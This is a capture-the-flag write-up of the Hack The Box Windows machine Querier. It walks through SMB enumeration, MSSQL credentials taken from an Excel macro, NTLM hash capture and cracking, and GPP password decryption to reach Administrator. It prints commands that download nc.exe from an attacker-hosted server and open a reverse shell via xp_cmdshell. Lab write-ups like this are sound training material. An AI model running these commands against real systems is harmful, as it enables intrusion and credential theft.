<hr />

<h2 id="quick-summary">Quick Summary</h2>
<p><br /> Hey guys today Querier retired and here’s my write-up about it. It was a great windows machine covering some interesting stuff and I enjoyed it.I wrote two posts for this machine, first one solving it with kali and the other one solving it with commando vm, you can find the second post <a href="/hack-the-box/querier-2/">here</a>. It’s a Windows box and its ip is <code class="highlighter-rouge">10.10.10.125</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">querier.htb</code>. Let’s jump right in!
<img src="/images/hackthebox/querier/0.png" alt="" /></p>
<hr />

<h2 id="nmap">Nmap</h2>
<p><br /> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
<code class="highlighter-rouge">nmap -sV -sT -sC querier.htb</code>
<img src="/images/hackthebox/querier/1.png" alt="" />
<br /> We got <code class="highlighter-rouge">smb</code> and <code class="highlighter-rouge">mssql</code> server on port 1433. Let’s check <code class="highlighter-rouge">smb</code>.
<br /></p>
<hr />

<h2 id="smb">Smb</h2>
<p><br /> We need to list the shares first. I used <code class="highlighter-rouge">smbclient</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient --list //querier.htb/ -U ""
Enter WORKGROUP\'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to querier.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
</code></pre></div></div>
<p><br /> Obviously if there’s an anonymously accessible share it will be <code class="highlighter-rouge">Reports</code>, Let’s see what’s in there :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/querier# smbclient //querier.htb/Reports/ -U ""
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Mon Jan 28 18:23:48 2019
  ..                                  D        0  Mon Jan 28 18:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019

                6469119 blocks of size 4096. 1608855 blocks available
</code></pre></div></div>
<p><br /> Only an Excel file.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: \&gt; get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (17.1 KiloBytes/sec) (average 17.1 KiloBytes/sec)
smb: \&gt;
</code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/querier# file Currency\ Volume\ Report.xlsm 
Currency Volume Report.xlsm: Microsoft Excel 2007+
</code></pre></div></div>
<p><br /></p>
<hr />

<h2 id="mssql-credentials-from-reportxlsm">MSSQL Credentials from Report.xlsm</h2>
<p><br /> I checked the contents of the excel file by just viewing it as it will be opened with the archive manager :
<img src="/images/hackthebox/querier/2.png" alt="" />
<br /> in <code class="highlighter-rouge">xl</code> I found <code class="highlighter-rouge">vbaProject.bin</code> so I used <code class="highlighter-rouge">olevba</code> from <a href="https://www.decalage.info/python/oletools"><code class="highlighter-rouge">oletools</code></a> to see if I can get anything :
<img src="/images/hackthebox/querier/3.png" alt="" /></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/querier# olevba Currency\ Volume\ Report.xlsm 
olevba 0.54.2 on Python 2.7.16 - http://decalage.info/python/oletools
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: u'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: u'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

</code></pre></div></div>
<p><br /> Great, we got connection credentials for the <code class="highlighter-rouge">mssql</code> server :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
</code></pre></div></div>
<p><br /></p>
<hr />

<h2 id="mssql">MSSQL</h2>
<p><br /> I used <code class="highlighter-rouge">mssqlclient.py</code> from <a href="https://github.com/SecureAuthCorp/impacket"><code class="highlighter-rouge">impacket</code></a> to connect to the server. First attempt failed :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/querier# /opt/impacket/examples/mssqlclient.py reporting@querier.htb -db volume 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[-] ERROR(QUERIER): Line 1: Login failed for user 'reporting'.
</code></pre></div></div>
<p><br /> I added the windows authentication option (<code class="highlighter-rouge">-windows-auth</code>) and it worked :
<img src="/images/hackthebox/querier/4.png" alt="" />
<br /> Unfortunately … permission denied for <code class="highlighter-rouge">xp_cmdshell</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; enable_xp_cmdshell
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
</code></pre></div></div>
<p><br /> I ran <code class="highlighter-rouge">responder</code> (<code class="highlighter-rouge">responder -I tun0</code>) and used <code class="highlighter-rouge">xp_dirtree</code> to see what hashes can I catch :
<img src="/images/hackthebox/querier/5.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/querier/6.png" alt="" /></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMBv2] NTLMv2-SSP Hash     : mssql-svc::QUERIER:53af3039d4607fd0:2423D19E432FFDDC2E4BF3B1E45272A5:0101000000000000C0653150DE09D201C11337A1C52B6EA7000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000030000051E8A512CD87D5811D02139C02C80CC4814E3213A0CCBD9EC4B588C8FCC85AD70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310039002E0032003700000000000000000000000000
[*] Skipping previously captured hash for QUERIER\mssql-svc
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : \gX
[SMBv2] NTLMv2-SSP Hash     : gX:::1d968811d030fdad::
[*] Skipping previously captured hash for \gX
</code></pre></div></div>
<p><br /> And we got the <code class="highlighter-rouge">NTLMv2</code> hash for <code class="highlighter-rouge">mssql-svc</code>. 
<br /> I used <code class="highlighter-rouge">john</code> and <code class="highlighter-rouge">rockyou</code> to crack the hash :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/querier# john --wordlist=/usr/share/wordlists/rockyou.txt mssql-svc.hash 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
1g 0:00:00:07 DONE (2019-06-21 07:41) 0.1321g/s 1184Kp/s 1184Kc/s 1184KC/s correforenz..corby909
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
</code></pre></div></div>
<p><br /> Now it’s time to enable <code class="highlighter-rouge">xp_cmdshell</code> and get a reverse shell. 
<img src="/images/hackthebox/querier/7.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/querier/8.png" alt="" />
<br /> We have <code class="highlighter-rouge">RCE</code>. I ran a python server to host <code class="highlighter-rouge">nc.exe</code> then I used <code class="highlighter-rouge">Invoke-WebRequest</code> to download it :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; EXEC xp_cmdshell 'powershell.exe Invoke-WebRequest -o C:\Users\mssql-svc\appdata\local\temp\nc.exe http://10.10.xx.xx/nc.exe'
output                                                                                                                                                                                                                                                            
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
NULL
</code></pre></div></div>
<p><br /> Then I got a reverse shell :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXEC xp_cmdshell 'C:\Users\mssql-svc\appdata\local\temp\nc.exe -e cmd.exe 10.10.xx.xx 1337'
</code></pre></div></div>
<p><img src="/images/hackthebox/querier/9.png" alt="" />
<br /> We owned user !
<br /></p>
<hr />

<h2 id="gpp-privilege-escalation-root-flag">GPP, Privilege Escalation, Root Flag</h2>
<p><br /> One of the things to check when enumerating Windows machines is group policy passwords which happened to be the privilege escalation vector here. I checked group policy passwords and found Administrator’s password :
<img src="/images/hackthebox/querier/10.png" alt="" />
<img src="/images/hackthebox/querier/11.png" alt="" />
<br /> <code class="highlighter-rouge">Groups.xml</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span><span class="nt">&lt;Groups</span> <span class="na">clsid=</span><span class="s">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="nt">&gt;</span>
<span class="nt">&lt;User</span> <span class="na">clsid=</span><span class="s">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> <span class="na">name=</span><span class="s">"Administrator"</span> <span class="na">image=</span><span class="s">"2"</span> <span class="na">changed=</span><span class="s">"2019-01-28 23:12:48"</span> <span class="na">uid=</span><span class="s">"{CD450F70-CDB8-4948-B908-F8D038C59B6C}"</span> <span class="na">userContext=</span><span class="s">"0"</span> <span class="na">removePolicy=</span><span class="s">"0"</span> <span class="na">policyApplied=</span><span class="s">"1"</span><span class="nt">&gt;</span>
<span class="nt">&lt;Properties</span> <span class="na">action=</span><span class="s">"U"</span> <span class="na">newName=</span><span class="s">""</span> <span class="na">fullName=</span><span class="s">""</span> <span class="na">description=</span><span class="s">""</span> <span class="na">cpassword=</span><span class="s">"CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ"</span> <span class="na">changeLogon=</span><span class="s">"0"</span> <span class="na">noChange=</span><span class="s">"0"</span> <span class="na">neverExpires=</span><span class="s">"1"</span> <span class="na">acctDisabled=</span><span class="s">"0"</span> <span class="na">userName=</span><span class="s">"Administrator"</span><span class="nt">&gt;&lt;/Properties&gt;&lt;/User&gt;&lt;/Groups&gt;</span>
</code></pre></div></div>
<p><br /> We still need to decrypt the password which can be easily done using <code class="highlighter-rouge">gpp-decrypt</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/querier# gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
MyUnclesAreMarioAndLuigi!!1!
</code></pre></div></div>
<p><br /> Password is <code class="highlighter-rouge">MyUnclesAreMarioAndLuigi!!1!</code>. We can use it with <code class="highlighter-rouge">psexec.py</code> from <code class="highlighter-rouge">impacket</code> and get a shell as system :
<code class="highlighter-rouge">psexec.py Administrator:'MyUnclesAreMarioAndLuigi!!1!'@querier.htb</code>
<img src="/images/hackthebox/querier/12.png" alt="" />
<br />  And we owned root !
<br /> That’s it , Feedback is appreciated !
<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
<br /> Thanks for reading.
<br />
<br />
<br /> Second write-up : <a href="/hack-the-box/querier-2">Hack The Box - Querier (Commando)</a>
<br /> Previous Hack The Box write-up : <a href="/hack-the-box/flujab/">Hack The Box - Flujab</a>
<br /> Next Hack The Box write-up : <a href="/hack-the-box/netmon/">Hack The Box - Netmon</a></p>
<hr />

